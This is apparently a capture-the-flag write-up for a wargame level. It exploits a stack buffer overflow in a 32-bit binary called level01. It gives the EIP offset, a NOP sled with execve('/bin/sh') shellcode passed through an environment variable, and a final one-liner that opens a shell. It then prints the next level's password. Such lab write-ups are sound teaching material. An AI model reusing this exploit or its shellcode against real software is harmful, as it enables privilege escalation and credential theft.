### step 1: Decompile with Ghidra

- We get the c source code of the program
- The binary is in 32-bits

```
file level01
level01: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=46d63f92a3bb0a950cf71dd3a5a630ade86057ab, not stripped
```

### step 2: Code analysis

- We are first asked a username that is compared to the string `dat_will` in the function `verify_user_name`  
- We are then asked a password that we can exploit with an overflow because 100 chars of stdin are read and stored in `buffer[16]`  


### step 3: Finding the EIP offset

```
( python -c 'print("dat_will")' ; python -c 'print("A" * 80)') | ./level01
```

- The EIP is overwritten at the 80th char, so our buffer will containe 79 bytes + the return address we will use in our exploit   

### step 4: Building the exploit with a Shellcode in Env

#### Shellcode 

```
env -i SHELLCODE=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') gdb level01
```

Our nope sled spans from `0xffffddae` to `0xffffdfae`, so we target an address in the middle : `0xffffdeae`.


#### Finding the address of the shellcode in env

```
env -i SHELLCODE=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') gdb level01
```

```gdb 
b main
r
x/s *((char **)environ + 3)
0xffffdda4:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\...
```
Our shellcode address is : `0xffffdda4`

- Our nopesled starts from `0xffffdda4` and spans over 512 bytes, so we target and address in the middle of the nopesled : `0xffffdeae`.

- We convert `0xffffdeae` in little endian : `\xae\xde\xff\xff`


#### Final Exploit

- Our final exploit is build like this :

```
( python -c 'print("dat_will")' ; python -c 'print("A" * 80 + "\xae\xde\xff\xff")' ; cat ) | env -i SHELLCODE=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') ./level01
```

- A shell is opened :

```
whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```